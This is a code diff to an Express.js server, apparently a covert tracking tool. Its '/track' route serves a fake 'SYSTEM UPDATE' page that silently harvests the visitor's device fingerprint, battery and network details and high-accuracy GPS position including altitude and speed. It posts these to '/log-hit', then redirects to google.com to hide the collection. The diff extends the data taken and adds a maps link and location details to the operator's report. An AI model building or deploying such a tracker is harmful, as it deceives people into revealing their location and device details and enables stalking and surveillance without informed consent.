@@ -101,46 +101,81 @@ app.get('/track', (req, res) => {
     console.log(`📡 [TRACKER] NEW HIT!`);
     res.send(`
         <html>
-        <head><title>System Update</title></head>
-        <body style="background: #000; color: #0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: monospace; text-align: center; padding: 20px;">
-        <h1>SYSTEM UPDATE</h1>
-        <p id="status">Verifying connection... Please wait.</p>
-        <script>
-        async function report(data) {
-            await fetch('/log-hit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        }
-        const info = {
-            ip: "${ip}",
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            language: navigator.language,
-            screen: screen.width + "x" + screen.height,
-            time: "${time}"
-        };
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                info.lat = pos.coords.latitude;
-                info.lon = pos.coords.longitude;
-                info.acc = pos.coords.accuracy;
-                report(info);
-            },
-            (err) => {
-                info.locError = err.message;
-                report(info);
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
-        report(info);
-        setTimeout(() => {
-            window.location.href = "https://google.com";
-        }, 3000);
-        </script>
-        </body>
+            <head>
+                <title>System Update</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            </head>
+            <body style="background: #000; color: #0f0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: monospace; text-align: center; padding: 20px;">
+                <h1>SYSTEM UPDATE</h1>
+                <p id="status">Verifying connection... Please wait.</p>
+                <script>
+                    async function report(data) {
+                        await fetch('/log-hit', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+                    }
+
+                    async function collectAll() {
+                        const info = {
+                            ip: "${ip}",
+                            ua: navigator.userAgent,
+                            platform: navigator.platform,
+                            vendor: navigator.vendor,
+                            language: navigator.language,
+                            screen: screen.width + "x" + screen.height,
+                            touchPoints: navigator.maxTouchPoints,
+                            cores: navigator.hardwareConcurrency,
+                            memory: navigator.deviceMemory,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            cookies: navigator.cookieEnabled,
+                            doNotTrack: navigator.doNotTrack,
+                            time: "${time}"
+                        };
+
+                        // Battery info
+                        if (navigator.getBattery) {
+                            try {
+                                const battery = await navigator.getBattery();
+                                info.battery = Math.round(battery.level * 100) + "%";
+                                info.charging = battery.charging ? "Yes" : "No";
+                            } catch (e) {}
+                        }
+
+                        // Connection info
+                        if (navigator.connection) {
+                            info.connection = navigator.connection.effectiveType;
+                            info.downlink = navigator.connection.downlink + "Mbps";
+                        }
+
+                        // Geolocation
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                info.lat = pos.coords.latitude;
+                                info.lon = pos.coords.longitude;
+                                info.acc = pos.coords.accuracy;
+                                info.alt = pos.coords.altitude;
+                                info.speed = pos.coords.speed;
+                                report(info);
+                            },
+                            (err) => {
+                                info.locError = err.message;
+                                report(info);
+                            },
+                            { enableHighAccuracy: true, timeout: 5000 }
+                        );
+
+                        report(info);
+                    }
+
+                    collectAll();
+
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 5000);
+                </script>
+            </body>
         </html>
     `);
 });
@@ -155,9 +190,17 @@ app.post('/log-hit', express.json(), async (req, res) => {
         report += `📱 *Device:* ${data.ua}\n`;
         report += `💻 *Platform:* ${data.platform}\n`;
         report += `📏 *Screen:* ${data.screen}\n`;
+        report += `🔋 *Battery:* ${data.battery || 'N/A'} (Charging: ${data.charging || 'N/A'})\n`;
+        report += `📶 *Network:* ${data.connection || 'N/A'} (${data.downlink || 'N/A'})\n`;
+        report += `🌍 *Timezone:* ${data.timezone || 'N/A'}\n`;
+        report += `🧠 *Hardware:* ${data.cores || 'N/A'} Cores, ${data.memory || 'N/A'}GB RAM\n`;
+        report += `👆 *Touch:* ${data.touchPoints || 0} Points\n`;
+        
         if (data.lat && data.lon) {
             report += `🗺️ *Location:* https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
             report += `🎯 *Accuracy:* ${data.acc}m\n`;
+            if (data.alt) report += `🏔️ *Altitude:* ${data.alt}m\n`;
+            if (data.speed) report += `🚀 *Speed:* ${data.speed}m/s\n`;
         } else if (data.locError) {
             report += `⚠️ *Location Error:* ${data.locError}\n`;
         }
